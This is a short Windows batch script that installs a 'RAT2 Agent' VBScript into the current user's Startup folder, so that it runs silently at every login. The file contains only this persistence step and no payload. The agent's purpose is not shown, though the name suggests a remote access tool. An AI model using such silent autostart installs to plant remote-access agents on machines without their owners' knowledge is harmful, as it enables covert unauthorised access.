@echo off
:: Installs RAT2 Agent to run silently at Windows login for the current user.
set SRC=%~dp0run_agent.vbs
set DST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RAT2_Agent.vbs

copy /y "%SRC%" "%DST%" >nul
if %errorlevel%==0 (
    echo RAT2 Agent installed. It will start automatically at next login.
) else (
    echo Failed to install. Try running as Administrator.
)
pause
